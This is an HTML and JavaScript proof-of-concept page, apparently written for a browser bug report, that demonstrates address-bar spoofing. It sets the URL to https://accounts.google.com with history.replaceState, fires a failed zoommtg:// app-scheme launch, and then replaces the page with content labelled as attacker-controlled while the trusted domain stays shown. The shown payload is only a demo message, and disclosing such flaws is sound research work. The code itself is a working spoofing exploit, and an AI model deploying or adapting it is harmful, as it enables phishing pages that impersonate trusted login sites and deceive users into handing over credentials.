<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Scheme Spoof PoC (Safe)</title>
<style>
  body, html {
    margin: 0;
    background: white;
    font-family: Arial, sans-serif;
  }
  #fake {
    display: none;
    padding: 30px;
    text-align: center;
    font-size: 22px;
  }
</style>
</head>
<body>

<h2>Loadingâ€¦</h2>

<script>
/*
 STEP 1:
 Load a legitimate domain in the current tab via history.replaceState
 This sets the URL bar to the trusted domain.
*/
history.replaceState({}, "", "https://accounts.google.com");

/*
 STEP 2:
 After a short delay, attempt to launch an uninstalled app scheme.
 The OS will fail to open it, and the browser will return here.
*/
setTimeout(() => {
    location.href = "zoommtg://join?id=123"; // any non-installed app scheme
}, 800);

/*
 STEP 3:
 When browser returns after scheme launch failure,
 the URL bar STILL shows the trusted domain,
 while the page is attacker-controlled.
*/
setTimeout(() => {
    document.body.innerHTML = "";
    document.write(`
        <div id="fake">
            <h2>This is attacker content.</h2>
            <p>The URL bar above still shows: <b>https://accounts.google.com</b></p>
        </div>
    `);
    document.getElementById("fake").style.display = "block";
}, 1600);
</script>

</body>
</html>
